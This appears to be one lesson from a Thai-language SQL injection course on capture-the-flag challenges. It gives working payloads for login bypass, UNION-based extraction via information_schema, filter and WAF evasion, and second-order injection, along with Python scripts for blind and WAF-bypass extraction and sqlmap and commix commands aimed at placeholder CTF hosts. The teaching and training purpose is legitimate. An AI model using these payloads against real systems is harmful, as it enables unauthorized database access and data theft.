# Part 030: SQL Injection ใน CTF Challenges

## ภาพรวม

CTF (Capture The Flag) competitions ใช้ SQL Injection เป็น challenge ยอดนิยม เรียนรู้เทคนิคพิเศษสำหรับ CTF

**ขั้นตอนที่ 416-435**

---

## 416. CTF SQLi Patterns

```
ประเภท CTF SQLi challenges:
1. Login bypass
2. Data extraction
3. Blind injection
4. WAF bypass
5. Filter bypass
6. Second-order injection
7. Whitebox (source code provided)
```

---

## 417. Filter Bypass Techniques

```sql
-- Filter: SELECT blocked
SELECT     (trailing spaces)
SELeCT     (case variation)
SEL/**/ECT (comment injection)

-- Filter: UNION blocked
UNION ALL SELECT  (ALL keyword)

-- Filter: space blocked
SELECT/**/1
SELECT%091
SELECT(1)

-- Filter: = blocked
WHERE 1 LIKE 1  (LIKE alternative)
WHERE 1<>0      (not equal 0 = true)

-- Filter: quote ' blocked
WHERE username=CHAR(97,100,109,105,110)  (admin)
WHERE username=0x61646d696e
```

---

## 418. ตัวอย่าง CTF Challenge 1: Login Bypass

```php
// โค้ด vulnerable
$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";

// Bypass:
// username: admin'-- 
// password: anything

// Query becomes:
SELECT * FROM users WHERE username='admin'-- ' AND password=MD5('anything')
// -- ตัด AND password check ออก

// Bypass admin เป็น admin'#
// username: admin'#
// Query: SELECT * FROM users WHERE username='admin'#' AND ...
```

---

## 419. ตัวอย่าง CTF Challenge 2: UNION Data Extraction

```sql
-- Flag อยู่ใน table 'secret'
-- หา column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error)
-- => 2 columns

-- หา columns ที่แสดง
' UNION SELECT 'a','b'--
-- เห็น 'b' ในหน้าเว็บ

-- หา tables
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()--
-- เห็น: users, secret

-- หา columns ใน secret
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='secret'--
-- เห็น: id, flag

-- ดึง flag
' UNION SELECT 1,flag FROM secret--
-- Flag: CTF{sql1_m4st3r}
```

---

## 420. ตัวอย่าง CTF Challenge 3: Blind SQLi

```python
import requests

url = "http://ctf.example.com/check"

def check(payload):
    r = requests.get(url, params={"id": payload})
    return "found" in r.text.lower() or len(r.text) > 500

# Boolean blind extraction
def get_flag():
    # หา length ของ flag
    for length in range(1, 100):
        if check(f"1 AND (SELECT LENGTH(flag) FROM secret LIMIT 1)={length}"):
            print(f"Flag length: {length}")
            break
    
    # Extract flag
    flag = ""
    for i in range(1, length + 1):
        for c in 'abcdefghijklmnopqrstuvwxyz0123456789_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            if check(f"1 AND SUBSTRING((SELECT flag FROM secret LIMIT 1),{i},1)='{c}'"):
                flag += c
                print(f"\r[+] Flag: {flag}", end='', flush=True)
                break
    
    print(f"\n[+] FINAL FLAG: {flag}")
    return flag

get_flag()
```

---

## 421. ตัวอย่าง CTF Challenge 4: WAF Bypass

```python
import requests

url = "http://ctf.example.com/search"

# WAF blocks: SELECT, UNION, OR, AND, space
# Bypass techniques

payloads = [
    # space bypass
    "1/**/UNION/**/SELECT/**/1,flag/**/FROM/**/secret--",
    
    # case bypass
    "1 UnIoN SeLeCt 1,flag FrOm secret--",
    
    # comment trick
    "1/*!UNION*//*!SELECT*/1,flag/*!FROM*/secret--",
    
    # MySQL version comment
    "1 UNION/*!50000SELECT*/1,flag FROM secret--",
    
    # OR bypass
    "1||1=1",
    "1||'1'='1'",
]

for p in payloads:
    r = requests.get(url, params={"q": p})
    if "CTF{" in r.text or r.status_code == 200:
        print(f"[+] Bypass found! Payload: {p}")
        print(f"    Response: {r.text[:200]}")
        break
```

---

## 422. ตัวอย่าง CTF Challenge 5: Second-Order

```
สถานการณ์:
1. Registration page: username = admin'--
   (ถูก escape และบันทึกใน DB)
2. Profile page: ดึงชื่อมาใช้ใน query อีกครั้ง (ไม่ escape)
   UPDATE users SET ... WHERE username='admin'--' (inject!)
3. Query ที่เกิด:
   UPDATE users SET email='evil@evil.com' WHERE username='admin'
   -- comment ตัด AND check ออก
```

---

## 423. เครื่องมือสำหรับ CTF

```bash
# SQLMap
sqlmap -u "http://ctf.example.com/search?id=1" \
  --dbs --batch --level=5 --risk=3

# Burp Suite Intruder
# - ส่ง request ไปยัง Intruder
# - Mark injection point
# - Load sqli wordlist
# - Start attack

# Manual Python script
# - ตาม template ใน parts ก่อนหน้า

# Commix (command injection tool)
pip install commix
commix --url="http://ctf.example.com/exec?cmd=ls"
```

---

## สรุป

SQL Injection ใน CTF:
- **Login bypass** - comment trick
- **Data extraction** - UNION SELECT
- **Blind** - boolean/time-based
- **WAF bypass** - encoding, comments, case
- **Second-order** - register + use
- **เครื่องมือ** - SQLMap, Burp Suite

---

*Part 030 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
